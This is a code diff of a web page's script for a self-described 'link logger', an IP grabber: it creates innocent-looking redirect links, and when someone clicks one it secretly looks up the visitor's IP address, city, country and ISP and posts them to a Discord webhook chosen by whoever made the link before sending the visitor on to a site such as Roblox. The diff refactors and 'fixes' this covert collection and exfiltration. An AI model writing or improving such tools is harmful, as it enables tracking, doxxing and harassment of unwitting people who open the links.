@@ -212,17 +212,6 @@
                 font-size: 1.6rem;
             }
         }
-        
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: black;
-            z-index: 9999;
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -272,121 +261,60 @@
 </div>
 
 <script>
-    // FULLY FIXED VERSION - PROPER EXTERNAL REDIRECT + RELIABLE WEBHOOK
     (function() {
-        let linkRegistry = new Map();
-        
-        function loadRegistryFromStorage() {
-            const stored = localStorage.getItem("logger_link_registry_v2");
+        // ==================== REDIRECT LOGIC (CRITICAL FIX) ====================
+        // THIS FUNCTION RUNS IMMEDIATELY WHEN THE PAGE LOADS
+        async function handleRedirectAndLog() {
+            // Get the 'id' parameter from the URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const slug = urlParams.get('id');
+            
+            // If no 'id' in URL, just show the dashboard (do nothing)
+            if (!slug) {
+                console.log("Dashboard mode - no redirect");
+                return;
+            }
+            
+            console.log("🔍 Logger triggered for slug:", slug);
+            
+            // Load the link registry from localStorage
+            let linkRegistry = new Map();
+            const stored = localStorage.getItem("logger_link_registry_v3");
             if (stored) {
                 try {
                     const parsed = JSON.parse(stored);
-                    for (const [slug, data] of Object.entries(parsed)) {
-                        linkRegistry.set(slug, data);
+                    for (const [s, data] of Object.entries(parsed)) {
+                        linkRegistry.set(s, data);
                     }
                 } catch(e) { console.warn(e); }
             }
-        }
-        
-        function saveRegistryToStorage() {
-            const obj = Object.fromEntries(linkRegistry);
-            localStorage.setItem("logger_link_registry_v2", JSON.stringify(obj));
-        }
-        
-        function generateSlug(aliasHint) {
-            let cleanAlias = aliasHint ? aliasHint.trim().toLowerCase().replace(/[^a-z0-9\-_]/g, '') : '';
-            if (cleanAlias && cleanAlias.length >= 3 && !linkRegistry.has(cleanAlias)) {
-                return cleanAlias;
-            } else if (cleanAlias && linkRegistry.has(cleanAlias)) {
-                return cleanAlias + '-' + Math.random().toString(36).substring(2, 6);
-            } else {
-                return Math.random().toString(36).substring(2, 10);
-            }
-        }
-        
-        // RELIABLE Discord webhook sender with retry mechanism
-        async function sendToDiscord(webhookUrl, visitorData, aliasName, destinationUrl) {
-            if (!webhookUrl || !webhookUrl.startsWith("https://discord.com/api/webhooks")) {
-                console.error("Invalid webhook URL");
-                return false;
+            
+            const mapping = linkRegistry.get(slug);
+            if (!mapping) {
+                document.body.innerHTML = '<div style="background:#000; color:#fff; text-align:center; padding:3rem;">Invalid or expired link.</div>';
+                return;
             }
             
-            const embed = {
-                title: "🕵️ LINK LOGGER — New Click Detected",
-                color: 0xdc2626,
-                fields: [
-                    {
-                        name: "🌐 IP Address",
-                        value: visitorData.ip || "unknown",
-                        inline: true
-                    },
-                    {
-                        name: "📍 Location",
-                        value: `${visitorData.city || "?"}, ${visitorData.country || "?"}`,
-                        inline: true
-                    },
-                    {
-                        name: "🏢 ISP / Provider",
-                        value: visitorData.isp || "unknown",
-                        inline: false
-                    },
-                    {
-                        name: "⏱️ Timestamp",
-                        value: visitorData.timestamp,
-                        inline: true
-                    },
-                    {
-                        name: "🏷️ Alias / Link ID",
-                        value: aliasName || "unnamed",
-                        inline: true
-                    },
-                    {
-                        name: "🎯 Redirect Target",
-                        value: destinationUrl || "unknown",
-                        inline: false
-                    }
-                ],
-                footer: {
-                    text: "Evidence Watchers • Toronto | Private Logger"
-                },
-                timestamp: new Date().toISOString()
-            };
+            let { targetUrl, webhookUrl, alias } = mapping;
             
-            const payload = {
-                embeds: [embed],
-                content: `⚠️ **NEW VISITOR** | \`${visitorData.ip || "no-ip"}\` | ${aliasName || "unknown"}`
-            };
-            
-            // Retry up to 2 times
-            for (let attempt = 1; attempt <= 2; attempt++) {
-                try {
-                    const resp = await fetch(webhookUrl, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(payload)
-                    });
-                    
-                    if (resp.ok) {
-                        console.log("✅ Discord notification sent successfully");
-                        return true;
-                    } else {
-                        const errorText = await resp.text();
-                        console.error(`Discord webhook attempt ${attempt} failed:`, resp.status, errorText);
-                        if (attempt === 2) return false;
-                        await new Promise(r => setTimeout(r, 300));
-                    }
-                } catch (err) {
-                    console.error(`Discord send attempt ${attempt} error:`, err);
-                    if (attempt === 2) return false;
-                    await new Promise(r => setTimeout(r, 300));
-                }
+            // ***** CRITICAL FIX: CONVERT TO ABSOLUTE EXTERNAL URL *****
+            // If the URL doesn't start with http:// or https://, add https://
+            let finalRedirect = targetUrl.trim();
+            if (!finalRedirect.match(/^https?:\/\//i)) {
+                finalRedirect = 'https://' + finalRedirect;
             }
-            return false;
-        }
-        
-        // Get accurate visitor data
-        async function fetchVisitorData() {
-            const payload = {
+            
+            console.log("🌐 Will redirect to EXTERNAL URL:", finalRedirect);
+            console.log("This is NOT a relative path on this domain");
+            
+            // Show a loading message
+            const loadingDiv = document.createElement('div');
+            loadingDiv.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;z-index:9999;font-family:monospace;';
+            loadingDiv.innerHTML = '<div style="text-align:center"><div>🔄 Redirecting to external site...</div><div style="font-size:12px;margin-top:10px;">please wait</div></div>';
+            document.body.appendChild(loadingDiv);
+            
+            // Get visitor data
+            let visitorPayload = {
                 ip: 'unknown',
                 city: 'unknown',
                 country: 'unknown',
@@ -395,209 +323,168 @@
             };
             
             try {
-                // Primary API - ipapi.co
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 2500);
-                const geoRes = await fetch('https://ipapi.co/json/', { signal: controller.signal });
-                clearTimeout(timeoutId);
-                
+                const geoRes = await fetch('https://ipapi.co/json/');
                 if (geoRes.ok) {
                     const geoData = await geoRes.json();
-                    payload.ip = geoData.ip || 'unknown';
-                    payload.city = geoData.city || 'unknown';
-                    payload.country = geoData.country_name || geoData.country || 'unknown';
-                    payload.isp = geoData.org || geoData.asn || 'unknown provider';
-                    return payload;
+                    visitorPayload = {
+                        ip: geoData.ip || 'unknown',
+                        city: geoData.city || 'unknown',
+                        country: geoData.country_name || geoData.country || 'unknown',
+                        isp: geoData.org || geoData.asn || 'unknown provider',
+                        timestamp: new Date().toISOString()
+                    };
                 }
             } catch (e) {
-                console.log("Primary geo API failed, trying backup...");
+                console.log("GeoIP fetch failed, using basic info");
             }
             
-            // Backup: ip-api.com (no key needed, limited but works)
-            try {
-                const backupRes = await fetch('http://ip-api.com/json/', { timeout: 2500 });
-                if (backupRes.ok) {
-                    const backupData = await backupRes.json();
-                    if (backupData && backupData.status === 'success') {
-                        payload.ip = backupData.query || 'unknown';
-                        payload.city = backupData.city || 'unknown';
-                        payload.country = backupData.country || 'unknown';
-                        payload.isp = backupData.isp || 'unknown provider';
-                        return payload;
-                    }
-                }
-            } catch(e) { console.log("Backup API also failed"); }
-            
-            // Last resort: just get IP
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                payload.ip = ipData.ip || 'unknown';
-            } catch(e2) {}
-            
-            return payload;
-        }
-        
-        // CRITICAL FIX: Proper redirect handler that goes DIRECTLY to external URL
-        async function handleLoggerRedirect() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const slug = urlParams.get('id');
-            
-            // No slug? Just return - showing dashboard
-            if (!slug) return;
-            
-            console.log("Logger triggered for slug:", slug);
-            
-            const mapping = linkRegistry.get(slug);
-            if (!mapping) {
-                document.body.innerHTML = '<div style="background:#000; color:#fff; text-align:center; padding:3rem;">Invalid or expired link.</div>';
-                return;
-            }
-            
-            const { targetUrl, webhookUrl, alias } = mapping;
-            
-            // CRITICAL FIX: Ensure proper absolute URL
-            let finalRedirect = targetUrl.trim();
-            // Add https:// if no protocol specified
-            if (!finalRedirect.match(/^https?:\/\//i)) {
-                finalRedirect = 'https://' + finalRedirect;
-            }
-            
-            console.log("Will redirect to EXTERNAL URL:", finalRedirect);
-            
-            // Show loading message (brief)
-            const loadingDiv = document.createElement('div');
-            loadingDiv.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;z-index:9999;font-family:monospace;';
-            loadingDiv.innerHTML = '<div style="text-align:center"><div>Redirecting...</div><div style="font-size:12px;margin-top:10px;">please wait</div></div>';
-            document.body.appendChild(loadingDiv);
-            
-            // Fetch visitor data AND send to Discord BEFORE redirect
-            try {
-                console.log("Fetching visitor data...");
-                const visitorData = await fetchVisitorData();
-                console.log("Visitor data obtained:", visitorData);
+            // Send to Discord webhook
+            if (webhookUrl && webhookUrl.startsWith('https://discord.com/api/webhooks')) {
+                const embed = {
+                    title: "🕵️ LINK LOGGER — New Click Detected",
+                    color: 0xdc2626,
+                    fields: [
+                        { name: "🌐 IP Address", value: visitorPayload.ip, inline: true },
+                        { name: "📍 Location", value: `${visitorPayload.city}, ${visitorPayload.country}`, inline: true },
+                        { name: "🏢 ISP / Provider", value: visitorPayload.isp, inline: false },
+                        { name: "⏱️ Timestamp", value: visitorPayload.timestamp, inline: true },
+                        { name: "🏷️ Alias / Link ID", value: alias || slug, inline: true },
+                        { name: "🎯 Redirect Target", value: finalRedirect, inline: false }
+                    ],
+                    footer: { text: "Evidence Watchers • Toronto | Private Logger" },
+                    timestamp: new Date().toISOString()
+                };
                 
-                if (webhookUrl && webhookUrl.startsWith("https://discord.com/api/webhooks")) {
-                    console.log("Sending to Discord webhook...");
-                    await sendToDiscord(webhookUrl, visitorData, alias || slug, finalRedirect);
-                    console.log("Discord send complete");
-                } else {
-                    console.warn("No valid webhook URL provided");
-                }
-            } catch (err) {
-                console.error("Error during logging process:", err);
+                fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ embeds: [embed], content: `⚠️ **NEW VISITOR** | \`${visitorPayload.ip}\` | ${alias || slug}` })
+                }).catch(err => console.error("Webhook error:", err));
             }
             
-            // FINAL REDIRECT - directly to external URL
-            console.log("Executing redirect to:", finalRedirect);
-            
-            // Small delay to ensure all console logs flush, then redirect
+            // ***** FINAL REDIRECT: GO DIRECTLY TO EXTERNAL URL *****
+            // Use a short delay to ensure the Discord request is sent
             setTimeout(() => {
-                // Use window.location.href for full external redirect
+                console.log("🚀 EXECUTING REDIRECT TO:", finalRedirect);
                 window.location.href = finalRedirect;
-            }, 200);
+            }, 150);
         }
         
-        // Run redirect handler immediately when page loads
-        handleLoggerRedirect();
+        // Run the redirect handler immediately
+        handleRedirectAndLog();
         
-        // ----- UI: GENERATE NEW LINK -----
-        const generateBtn = document.getElementById('generateBtn');
-        const targetUrlInput = document.getElementById('targetUrl');
-        const aliasInput = document.getElementById('aliasName');
-        const webhookInput = document.getElementById('webhookUrl');
-        const outputSection = document.getElementById('outputSection');
-        const shortUrlSpan = document.getElementById('shortUrlSpan');
-        const copyUrlBtn = document.getElementById('copyUrlBtn');
-        const statusMsgSpan = document.getElementById('statusMsg');
-        
-        function getBaseUrl() {
-            const { protocol, host, pathname } = window.location;
-            // Remove the filename if present
-            let basePath = pathname;
-            const lastSlash = pathname.lastIndexOf('/');
-            if (lastSlash > 0 && pathname.includes('.html')) {
-                basePath = pathname.substring(0, lastSlash + 1);
-            } else if (!pathname.endsWith('/')) {
-                basePath = pathname + '/';
-            }
-            return `${protocol}//${host}${basePath}`;
-        }
-        
-        generateBtn.addEventListener('click', () => {
-            let targetUrl = targetUrlInput.value.trim();
-            let alias = aliasInput.value.trim();
-            let webhook = webhookInput.value.trim();
+        // ==================== DASHBOARD UI CODE ====================
+        // Only runs if we're not in redirect mode (no 'id' param)
+        const urlParams = new URLSearchParams(window.location.search);
+        if (!urlParams.get('id')) {
+            // Show dashboard UI and setup link generation
+            let linkRegistry = new Map();
             
-            // Validations
-            if (!targetUrl) {
-                statusMsgSpan.innerText = "❌ Error: Destination URL is required (e.g., https://roblox.com)";
-                statusMsgSpan.className = "status error";
-                outputSection.style.display = 'block';
-                return;
+            function loadRegistry() {
+                const stored = localStorage.getItem("logger_link_registry_v3");
+                if (stored) {
+                    try {
+                        const parsed = JSON.parse(stored);
+                        for (const [slug, data] of Object.entries(parsed)) {
+                            linkRegistry.set(slug, data);
+                        }
+                    } catch(e) { console.warn(e); }
+                }
             }
             
-            if (!webhook || !webhook.startsWith('https://discord.com/api/webhooks')) {
-                statusMsgSpan.innerText = "⚠️ Valid Discord Webhook URL required (starts with https://discord.com/api/webhooks)";
-                statusMsgSpan.className = "status error";
-                outputSection.style.display = 'block';
-                return;
+            function saveRegistry() {
+                const obj = Object.fromEntries(linkRegistry);
+                localStorage.setItem("logger_link_registry_v3", JSON.stringify(obj));
             }
             
-            // FIX: Proper URL validation and formatting
-            let validatedUrl = targetUrl;
-            if (!validatedUrl.match(/^https?:\/\//i)) {
-                validatedUrl = 'https://' + validatedUrl;
+            function generateSlug(hint) {
+                let clean = hint ? hint.trim().toLowerCase().replace(/[^a-z0-9\-_]/g, '') : '';
+                if (clean && clean.length >= 3 && !linkRegistry.has(clean)) return clean;
+                if (clean && linkRegistry.has(clean)) return clean + '-' + Math.random().toString(36).substring(2, 6);
+                return Math.random().toString(36).substring(2, 10);
             }
             
-            try {
-                const urlObj = new URL(validatedUrl);
-                validatedUrl = urlObj.href;
-            } catch(e) {
-                statusMsgSpan.innerText = "❌ Invalid URL format. Please enter a valid link (e.g., roblox.com or https://example.com)";
-                statusMsgSpan.className = "status error";
-                outputSection.style.display = 'block';
-                return;
+            function getBaseUrl() {
+                const { protocol, host, pathname } = window.location;
+                let base = `${protocol}//${host}${pathname}`;
+                if (base.endsWith('/')) base = base.slice(0, -1);
+                const lastSlash = base.lastIndexOf('/');
+                if (base.includes('.html') && lastSlash > 0) base = base.substring(0, lastSlash + 1);
+                if (!base.endsWith('/')) base = base + '/';
+                return base;
             }
             
-            // Generate slug and URL
-            const slug = generateSlug(alias);
-            const baseUrl = getBaseUrl();
-            const loggerUrl = `${baseUrl}?id=${encodeURIComponent(slug)}`;
+            const generateBtn = document.getElementById('generateBtn');
+            const targetUrlInput = document.getElementById('targetUrl');
+            const aliasInput = document.getElementById('aliasName');
+            const webhookInput = document.getElementById('webhookUrl');
+            const outputSection = document.getElementById('outputSection');
+            const shortUrlSpan = document.getElementById('shortUrlSpan');
+            const copyUrlBtn = document.getElementById('copyUrlBtn');
+            const statusMsgSpan = document.getElementById('statusMsg');
             
-            // Store mapping
-            linkRegistry.set(slug, {
-                targetUrl: validatedUrl,
-                webhookUrl: webhook,
-                alias: alias || slug,
-                createdAt: Date.now()
-            });
-            saveRegistryToStorage();
-            
-            // Display
-            shortUrlSpan.innerText = loggerUrl;
-            outputSection.style.display = 'block';
-            statusMsgSpan.innerText = "✅ Logger link active! Visitors will be redirected to " + validatedUrl;
-            statusMsgSpan.className = "status success";
-            
-            // Copy button
-            copyUrlBtn.onclick = () => {
-                navigator.clipboard.writeText(loggerUrl).then(() => {
-                    statusMsgSpan.innerText = "📋 Copied to clipboard! Share the logger link.";
-                    setTimeout(() => {
-                        statusMsgSpan.innerText = "✅ Logger link active! Visitors will be redirected to " + validatedUrl;
-                    }, 2000);
-                }).catch(() => {
-                    statusMsgSpan.innerText = "⚠️ Manual copy failed";
+            generateBtn.addEventListener('click', () => {
+                let targetUrl = targetUrlInput.value.trim();
+                let alias = aliasInput.value.trim();
+                let webhook = webhookInput.value.trim();
+                
+                if (!targetUrl) {
+                    statusMsgSpan.innerText = "❌ Error: Destination URL is required";
+                    statusMsgSpan.className = "status error";
+                    outputSection.style.display = 'block';
+                    return;
+                }
+                
+                if (!webhook || !webhook.startsWith('https://discord.com/api/webhooks')) {
+                    statusMsgSpan.innerText = "⚠️ Valid Discord Webhook URL required";
+                    statusMsgSpan.className = "status error";
+                    outputSection.style.display = 'block';
+                    return;
+                }
+                
+                // Format URL properly
+                let finalUrl = targetUrl;
+                if (!finalUrl.match(/^https?:\/\//i)) {
+                    finalUrl = 'https://' + finalUrl;
+                }
+                
+                try {
+                    new URL(finalUrl);
+                } catch(e) {
+                    statusMsgSpan.innerText = "❌ Invalid URL format";
+                    statusMsgSpan.className = "status error";
+                    outputSection.style.display = 'block';
+                    return;
+                }
+                
+                const slug = generateSlug(alias);
+                const loggerUrl = `${getBaseUrl()}?id=${encodeURIComponent(slug)}`;
+                
+                linkRegistry.set(slug, {
+                    targetUrl: finalUrl,
+                    webhookUrl: webhook,
+                    alias: alias || slug,
+                    createdAt: Date.now()
                 });
-            };
-        });
-        
-        // Load existing registry
-        loadRegistryFromStorage();
-        
-        // Log for debugging
-        console.log("Logger dashboard ready. Active links:", linkRegistry.size);
+                saveRegistry();
+                
+                shortUrlSpan.innerText = loggerUrl;
+                outputSection.style.display = 'block';
+                statusMsgSpan.innerText = `✅ Active! Redirects to: ${finalUrl}`;
+                statusMsgSpan.className = "status success";
+                
+                copyUrlBtn.onclick = () => {
+                    navigator.clipboard.writeText(loggerUrl);
+                    statusMsgSpan.innerText = "📋 Copied!";
+                    setTimeout(() => {
+                        statusMsgSpan.innerText = `✅ Active! Redirects to: ${finalUrl}`;
+                    }, 2000);
+                };
+            });
+            
+            loadRegistry();
+            console.log("Dashboard ready");
+        }
     })();
 </script>
 </body>
